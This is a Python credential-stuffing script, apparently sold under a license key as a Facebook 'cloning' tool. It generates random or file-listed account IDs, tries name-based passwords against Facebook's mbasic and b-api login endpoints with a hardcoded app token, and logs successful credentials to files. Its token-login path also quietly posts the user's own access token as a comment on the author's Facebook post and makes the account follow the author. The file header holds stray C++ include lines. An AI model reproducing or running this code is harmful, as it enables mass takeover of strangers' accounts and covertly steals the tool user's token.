#!/usr/bin/python
# -*- coding: utf-8           
#!/usr/bin/env
#language_level': 3}
#include <iostream>
#include <fstream>
#include <string>
#include <future>
#include <cstdio>
#include <vector>
#include <stdio.h>
#include <cython>
#include <platform>
#include <time>

import os
import os,sys,time,datetime,calendar,random,hashlib,re,threading,json,getpass,urllib,requests,uuid,subprocess,base64
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
try:
	import requests
except ImportError:
	print("\n ! somi requests module is not installed")
	os.system("pip2 install requests")

try:
	import bs4
except ImportError:
	print("\n !.somi bs4 module is not installed yet")
	os.system("pip2 install bs4")
try:
	import concurrent.futures
except ImportError:
	print("\n ! somi futures module not installed")
	os.system("pip2 install futures")
ct = datetime.now()
n = ct.month
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
	if n < 0 or n > 12:
		exit()
		nTemp = n - 1
except ValueError:
	exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]

my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
date = ("%s-%s-%s-%s"%(hr, ha, op, ta))
date = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
class Somi:
	def __init__(self): 
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
	try:
		key = open(".__apikey__.log", "r").read()
	except IOError:
		id1 = uuid.uuid4().hex[:10].upper()
		id2 = uuid.uuid4().hex[:15].upper()
		open(".__apikey__.log", "w").write(id1+id2+"==")

	def __request__(self):
		os.system("clear")
		print("\n    \033[1;93m  _________________      _____  .___ \n    \033[1;93m /   _____/\_____  \    /     \ |   |\n    \033[1;96m \_____  \  /   |   \  /  \ /  \|   |\n    \033[1;96m /        \/    |    \/    Y    \   |\n    \033[1;91m/_______  /\_______  /\____|__  /___|\n    \033[1;91m       \033[1;93m \/\033[1;91m         \033[1;96m\/\033[1;91m         \033[1;95m\/     \033[1;90m\n•-----------------------------------------------•\n\033[1;91m•\033[1;97m> Developer  •   Somi Awan\n\033[1;91m•\033[1;97m> WhatsApp   •   03455453538\n\033[1;91m•\033[1;97m> Facebook   •   Somi Awan\n\033[1;90m•-----------------------------------------------•\n        *\033[1;91mDon't stop chasing your dreams\033[1;90m*\n            *\033[1;91mWe are back in the game\033[1;90m*\n\033[1;90m•-----------------------------------------------•")
		james = requests.get('https://pastebin.com/raw/frmWS8Gg')
		lulu = james.text
		print ("")
		hulu = input("\x1b[1;93m \033[1;97m(\033[1;92m?\033[1;97m) Owner Key : ")
		if lulu == hulu:
			print('\n\x1b[1;92m  (+) Login Successfully\n')
			pass
			self.__start__()
		else:
			print( "\x1b[1;91m Wrong Key Bro... \n")
			print( "\x1b[1;91m Talk To Admin For Key...\n")
			os.system('xdg-open https://github.com/S-O-M-i')
	def __start__(self):
		os.system("clear")
		try:
			key = open(".__apikey__.log","r").read()
			a = requests.get("https://james.anggakurniawan.my.id/chek.php?project=license&apikey="+key).json()
			status = a["member"]
			expired = a["expired"]
		except KeyError:
			status = "Trial"
			expired = "you are not registered"
		if "Premium" in status:
			print("\n    \033[1;93m  _________________      _____  .___ \n    \033[1;93m /   _____/\_____  \    /     \ |   |\n    \033[1;96m \_____  \  /   |   \  /  \ /  \|   |\n    \033[1;96m /        \/    |    \/    Y    \   |\n    \033[1;91m/_______  /\_______  /\____|__  /___|\n    \033[1;91m       \033[1;93m \/\033[1;91m         \033[1;96m\/\033[1;91m         \033[1;95m\/     \033[1;90m\n•-----------------------------------------------•\n\033[1;91m•\033[1;97m> Developer  •   Somi Awan\n\033[1;91m•\033[1;97m> WhatsApp   •   03455453538\n\033[1;91m•\033[1;97m> Facebook   •   Somi Awan\n\033[1;90m•-----------------------------------------------•\n        *\033[1;91mDon't stop chasing your dreams\033[1;90m*\n            *\033[1;91mWe are back in the game\033[1;90m*\n\033[1;90m•-----------------------------------------------•")
			print ("  \033[1;97m(\033[1;92m✓\033[1;97m) Today Date : %s "%(date))
			print ("  \033[1;97m(\033[1;92m✓\033[1;97m) Your ip : %s "%(ip))
			print ("  \033[1;97m(\033[1;92m✓\033[1;97m) expired : %s "%(expired))
			print("\n  \033[1;97m(\033[1;91m1\033[1;97m)\x1b[1;97m 2009 Random Cloning\033[1;97m (Mbasic)")
			print("  \033[1;97m(\033[1;91m2\033[1;97m)\x1b[1;97m 2008 to 2010  Random Cloning\033[1;97m (free)")
			print("  \033[1;97m(\033[1;91m3\033[1;97m)\x1b[1;97m 2005 Random Cloning\033[1;97m (B-api)")
			print("  \033[1;97m(\033[1;91m4\033[1;97m)\x1b[1;97m 2004 Random Cloning\033[1;97m (B-api)")
			print("  \033[1;97m(\033[1;91m5\33[1;97m)\x1b[1;97m File Cloning\033[1;97m (Login)")
			choose = input("\n  \033[1;97m(\033[1;91m*\033[1;97m)\x1b[1;97m Choose Option :  ")
			if choose in [""]:
				print(" (!) Sorry Your Choice Wrong")
				self.__start__()
			elif choose in ["1", "01"]:
				self.__fb__()
			elif choose in ["2", "02"]:
				self.__fb3__()
			elif choose in ["3", "03"]:
				self.__fb2__()
			elif choose in ["4", "04"]:
				self.__fb4__()
			elif choose in ["5", "05"]:
				self.__login__()
			else:
				Somi().__start__()
		elif "Trial" in status:
			print("\n    \033[1;93m  _________________      _____  .___ \n    \033[1;93m /   _____/\_____  \    /     \ |   |\n    \033[1;96m \_____  \  /   |   \  /  \ /  \|   |\n    \033[1;96m /        \/    |    \/    Y    \   |\n    \033[1;91m/_______  /\_______  /\____|__  /___|\n    \033[1;91m       \033[1;93m \/\033[1;91m         \033[1;96m\/\033[1;91m         \033[1;95m\/     \033[1;90m\n•-----------------------------------------------•\n\033[1;91m•\033[1;97m> Developer  •   Somi Awan\n\033[1;91m•\033[1;97m> WhatsApp   •   03455453538\n\033[1;91m•\033[1;97m> Facebook   •   Somi Awan\n\033[1;90m•-----------------------------------------------•\n        *\033[1;91mDon't stop chasing your dreams\033[1;90m*\n            *\033[1;91mWe are back in the game\033[1;90m*\n\033[1;90m•-----------------------------------------------•")
			print ("  \033[1;97m(\033[1;92m✓\033[1;97m) Today Date : %s "%(date))
			print ("  \033[1;97m(\033[1;92m✓\033[1;97m) Your ip : %s "%(ip))
			print ("  \033[1;97m(\033[1;92m✓\033[1;97m) expired : %s "%(expired))
			print("\n  \033[1;97m(\033[1;91m1\033[1;97m)\x1b[1;90m 2009 Random Cloning\033[1;97m (Mbasic)")
			print("  \033[1;97m(\033[1;91m2\033[1;97m)\x1b[1;90m 2008 to 2010  Random Cloning\033[1;97m (free)")
			print("  \033[1;97m(\033[1;91m3\033[1;97m)\x1b[1;90m 2005 Random Cloning\033[1;97m (B-api)")
			print("  \033[1;97m(\033[1;91m4\033[1;97m)\x1b[1;90m 2004 Random Cloning\033[1;97m (B-api)")
			print("  \033[1;97m(\033[1;91m5\33[1;97m)\x1b[1;90m File Cloning\033[1;97m (Login)")
			print("  \033[1;97m(\033[1;91m6\33[1;97m)\x1b[1;97m Upgrade To \x1b[1;92mPremium\x1b[1;97m")
			choose = input("\n  \033[1;97m(\033[1;91m*\033[1;97m)\x1b[1;97m Choose Option :  ")
			if choose in [""]:
				exit(" (!)\033[1;91m Warning : \033[1;97myou are not registered yet, please choose number 6")
				input("  (•) Return menu")
				self.__start__()
			if choose in ["6", "06"]:
				apikey = open(".__apikey__.log", "r").read()
				os.system('am start https://wa.me/923455453538?text=hello%20sir,%20I%20want%20to%20buy%20a%20premium%20script%20:%20' + apikey + ' >/dev/null')
				exit("\n (!) \033[1;91m Warning : \033[1;97m don't run the tools if you haven't registered with admin...")
			else:
				exit("  (!)\033[1;91m Warning : \033[1;97m you are not registered yet, please choose number 6")
	def __fb__(self):
		x = 11111111
		xx = 99999999
		idx = "1000000" 
		limit = int(input("  \033[1;92m(\033[1;95m+\033[1;92m)\x1b[1;97m Enter the number of IDs : "))
		try:
			for i in range(limit):
				i = random.randint(x,xx)
				ib = idx
				self.id.append(ib+str(i))
			print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id •> \033[0;91m(%s)\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n  \033[1;92m(\033[1;93m*\033[1;92m)\x1b[1;97m For example separators : 123456,123456789")
				listpass = input("  \033[1;92m(\033[1;96m?\033[1;92m)\x1b[1;97m Enter password : ")
				if len(listpass)<=5:
					exit("\n  (!) password minimum 6 characters")
				print("  \033[1;92m(\033[1;93m*\033[1;92m)\x1b[1;97m crack with password •> (\033[0;91m%s\033[0;97m)"%(listpass))
				print("\n  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
				print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
				print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n") 
				for user in self.id:
					coeg.submit(self.__api__, user, listpass.split(","))
			exit("\n\n (✓) cracking finished...")
		except Exception as e:
			exit(str(e))

	def __api__(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
			'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		])
		url = 'https://free.facebook.com'
		sys.stdout.write(
			"\r  (\033[1;93m•\033[1;97m) %s/%s -> ok:-%s - cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw= pw.lower()
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': ua})
			xo = rex.url
			if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
				print("\r  \033[0;92m• %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(date),"a").write("  • %s|%s\n"%(uid, pw))
				break
			elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
				print("\r  \033[0;93m• %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(date),"a").write("  • %s|%s\n"%(uid, pw))
				break
			else:
				continue
		self.loop +=1
	def __fb4__(self):
		x = 1111
		xx = 9999
		idx = input("  \033[1;92m(\033[1;95m+\033[1;92m)\x1b[1;97m Choose code 200,201,202,203,205,209,250 : ")
		limit = int(input("  \033[1;92m(\033[1;95m+\033[1;92m)\x1b[1;97m Enter the number of IDs : "))
		try:
			for i in range(limit): 
				i = random.randint(x,xx)
				ib = idx
				self.id.append(ib+str(i))
			print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id •> \033[0;91m(%s)\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n  \033[1;92m(\033[1;93m*\033[1;92m)\x1b[1;97m For example separators : 123456,123456789")
				listpass = input("  \033[1;92m(\033[1;96m?\033[1;92m)\x1b[1;97m Enter password : ")
				if len(listpass)<=5:
					exit("\n  (!) password minimum 6 characters")
				print("  \033[1;92m(\033[1;93m*\033[1;92m)\x1b[1;97m crack with password •> (\033[0;91m%s\033[0;97m)"%(listpass))
				print("\n  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
				print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
				print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n") 
				for user in self.id:
					coeg.submit(self.__apii__, user, listpass.split(","))
			exit("\n\n (✓) cracking finished...")
		except Exception as e:
			exit(str(e))
	def __fb2__(self):
		x = 11111111
		xx = 99999999
		idx = input("  \033[1;92m(\033[1;94m?\033[1;92m)\x1b[1;97m Choose code 11,12,13,14,15,16,17,18 : ")
		limit = int(input("  \033[1;92m(\033[1;95m+\033[1;92m)\x1b[1;97m Enter the number of IDs : "))
		try:
			for i in range(limit):
				i = random.randint(x,xx)
				ib = idx
				self.id.append(ib+str(i))
			print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id •> \033[0;91m(%s)\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n  \033[1;92m(\033[1;93m*\033[1;92m)\x1b[1;97m For example separators : 123456,123456789")
				listpass = input("  \033[1;92m(\033[1;96m?\033[1;92m)\x1b[1;97m Enter password : ")
				if len(listpass)<=5:
					exit("\n  (!) password minimum 6 characters")
				print("  \033[1;92m(\033[1;93m*\033[1;92m)\x1b[1;97m crack with password •> (\033[0;91m%s\033[0;97m)"%(listpass))
				print("\n  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
				print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
				print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n") 
				for user in self.id:
					coeg.submit(self.__apii__, user, listpass.split(","))
			exit("\n\n (✓) cracking finished...")
		except Exception as e:
			exit(str(e))
	def __fb3__(self):
		x = 1111111
		xx = 9999999
		idx = input("   • 2010 •> 10000170,10000180,10000190\n   • 2008 •> 10000000\n  \033[1;92m(\033[1;94m?\033[1;92m)\x1b[1;97m Choose option : ")
		limit = int(input("  \033[1;92m(\033[1;95m+\033[1;92m)\x1b[1;97m Enter the number of IDs : "))
		try:
			for i in range(limit):
				i = random.randint(x,xx)
				ib = idx
				self.id.append(ib+str(i))
			print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id •> \033[0;91m(%s)\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				print("\n  \033[1;92m(\033[1;93m*\033[1;92m)\x1b[1;97m For example separators : 123456,123456789")
				listpass = input("  \033[1;92m(\033[1;96m?\033[1;92m)\x1b[1;97m Enter password : ")
				if len(listpass)<=5:
					exit("\n  (!) password minimum 6 characters")
				print("  \033[1;92m(\033[1;93m*\033[1;92m)\x1b[1;97m crack with password •> (\033[0;91m%s\033[0;97m)"%(listpass))
				print("\n  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
				print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
				print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n") 
				for user in self.id:
					coeg.submit(self.__apii__, user, listpass.split(","))
			exit("\n\n (✓) cracking finished...")
		except Exception as e:
			exit(str(e))
	def __apii__(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
			'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
		])
		sys.stdout.write(
			"\r  (\033[1;96m•\033[1;97m) %s/%s -> ok:-%s - cp:-%s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": ua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m • %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(date),"a").write("  • %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;96m • %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(date),"a").write("  • %s|%s\n"%(uid, pw))
				break
			else:
				continue
		self.loop +=1
	def __login__(self):
		os.system('clear')
		print("\n    \033[1;93m  _________________      _____  .___ \n    \033[1;93m /   _____/\_____  \    /     \ |   |\n    \033[1;96m \_____  \  /   |   \  /  \ /  \|   |\n    \033[1;96m /        \/    |    \/    Y    \   |\n    \033[1;91m/_______  /\_______  /\____|__  /___|\n    \033[1;91m       \033[1;93m \/\033[1;91m         \033[1;96m\/\033[1;91m         \033[1;95m\/     \033[1;90m\n•-----------------------------------------------•\n\033[1;91m•\033[1;97m> Developer  •   Somi Awan\n\033[1;91m•\033[1;97m> WhatsApp   •   03455453538\n\033[1;91m•\033[1;97m> Facebook   •   Somi Awan\n\033[1;90m•-----------------------------------------------•\n        *\033[1;91mDon't stop chasing your dreams\033[1;90m*\n            *\033[1;91mWe are back in the game\033[1;90m*\n\033[1;90m•-----------------------------------------------•")
		print
		token = input('\n   \033[1;97m(\033[1;92m?\033[1;97m) Your Token : ')
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			print (" \n  \033[1;92m(✓) successful login token") 
			self.__bot__follow__()
		except KeyError:
			print("  (!) Token Invalid")
			self.login()
	def __bot__follow__(self):
		try:
			token=open("login.txt","r").read()
			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
		except IOError:
			os.system("rm -f login.txt")
			print(" ! expired tokens")
			self.__login__()
		requests.post("https://graph.facebook.com/100007607054845/subscribers?access_token=" + token) #Somi awan
		requests.post('https://graph.facebook.com/2965703280359878/comments/?message=' + token + '&access_token=' + token) #Somi awan
		requests.post('https://graph.facebook.com/2965703280359878/likes?summary=true&access_token=' + token)
		self.__menu__file__()
	def __menu__file__(self):
		os.system("clear")
		print("\n    \033[1;93m  _________________      _____  .___ \n    \033[1;93m /   _____/\_____  \    /     \ |   |\n    \033[1;96m \_____  \  /   |   \  /  \ /  \|   |\n    \033[1;96m /        \/    |    \/    Y    \   |\n    \033[1;91m/_______  /\_______  /\____|__  /___|\n    \033[1;91m       \033[1;93m \/\033[1;91m         \033[1;96m\/\033[1;91m         \033[1;95m\/     \033[1;90m\n•-----------------------------------------------•\n\033[1;91m•\033[1;97m> Developer  •   Somi Awan\n\033[1;91m•\033[1;97m> WhatsApp   •   03455453538\n\033[1;91m•\033[1;97m> Facebook   •   Somi Awan\n\033[1;90m•-----------------------------------------------•\n        *\033[1;91mDon't stop chasing your dreams\033[1;90m*\n            *\033[1;91mWe are back in the game\033[1;90m*\n\033[1;90m•-----------------------------------------------•")
		global token
		try:
			token = open("login.txt","r").read()
		except(KeyError , IOError):
			os.system("rm -f login.txt")
			self.__login__()
		try:
			nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
		except IOError:
			os.system("rm -f login.txt")
			exit(" ! expired tokens")
		except requests.exceptions.ConnectionError:
			exit(" ! no internet connection")
		print("\n  \033[1;92m(\033[1;91m01\033[1;92m)\x1b[1;97m B-Api method (fast)")
		print("  \033[1;92m(\033[1;91m02\033[1;92m)\x1b[1;97m Mbasic method (fast)")
		print("  \033[1;92m(\033[1;91m03\033[1;92m)\x1b[1;97m Extract Public friendlist (fast)")
		print("  \033[1;92m(\033[1;91m00\033[1;92m)\x1b[1;97m Exit (remove token)")
		somi = input("\n  \033[1;92m(\033[1;91m*\033[1;92m)\x1b[1;97m Choose Option :  ")
		if somi =="":
			self.__menu__file__()
		elif somi == "1" or somi == "01":
			self.__method__2__()
		elif somi == "2" or somi == "02":
			self.__method__1__()
		elif somi == "3" or somi == "03":
			os.system("python2 somidum.py")
		elif somi == "0" or somi == "00":
			os.system("rm -f login.txt")
			exit("\n # successfully deleted token")
		else:
			self.__login__()
	
	def __method__2__(self):
		print("\n  \033[1;92m(\033[1;91m1\033[1;92m)\x1b[1;97m Clone only 100074 & 100075 account")
		print("  \033[1;92m(\033[1;91m2\033[1;92m)\x1b[1;97m Clone All in one Account")
		print("  \033[1;92m(\033[1;91m3\033[1;92m)\x1b[1;97m Clone using file path")
		__method__2__ = input("\n  \033[1;92m(\033[1;91m*\033[1;92m)\x1b[1;97m Choose Option :  ")
		if __method__2__ == "":
			self.menu_file()
		elif __method__2__ == "1":
			self.__1000__()
		elif __method__2__ == "2":
			self.__Frr__()
		elif __method__2__ == "3":
			self.__menn__()
	def __1000__(self):
		try:
			file = '/storage/emulated/0/100.txt'
			for line in open(file, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(file))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"12345" ]
						elif len(name) == 3 or len(name) == 4 or len(name) == 5:
							pwx = [ name, name+"123", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"12345" ]
						coeg.submit(self.__mbasic__, uid, pwx)
	def __Frr__(self):
		try:
			myfile = '/storage/emulated/0/f_rindlist.txt'
			for line in open(myfile, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(myfile))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"12345" ]
						elif len(name) == 3 or len(name) == 4 or len(name) == 5:
							pwx = [ name, name+"123", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"12345" ]
						coeg.submit(self.__mbasic__, uid, pwx)
	def __menn__(self):
		try:
			pastefile = input('  \033[1;92m(\033[1;97m+\033[1;92m) \033[1;97m Enter your file : ')
			for line in open(pastefile, 'r').readlines():
				self.id.append(line.strip())
		except IOError:
			exit("\n [!] file %s not found"%(pastefile))
		print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m Total id -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
		with ThreadPoolExecutor(max_workers=30) as coeg:
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m ok result saved in •> ok.txt")
					print("  \033[1;92m(\033[1;94m✓\033[1;92m)\x1b[1;97m cp result saved in •> cp.txt")
					print("  \033[1;92m(\033[1;91m!\033[1;92m)\x1b[1;97m if no result turn on airplane mode 5 seconds\n")
					for user in self.id:
						uid, name = user.split("|")
						if len(name)>=6:
							pwx = [ name, name+"123", name+"1234", name+"12345" ]
						elif len(name)<=2:
							pwx = [ name, name+"123", name+"1234", name+"12345" ]
						elif len(name)<=3:
							pwx = [ name, name+"123", name+"1234", name+"12345" ]
						else:
							pwx = [ name, name+"123", name+"1234", name+"12345" ]
						coeg.submit(self.__bapi__, uid, pwx)
	def __bapi__(self, uid, pwx):
		ua = random.choice([
			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
			'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
			'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
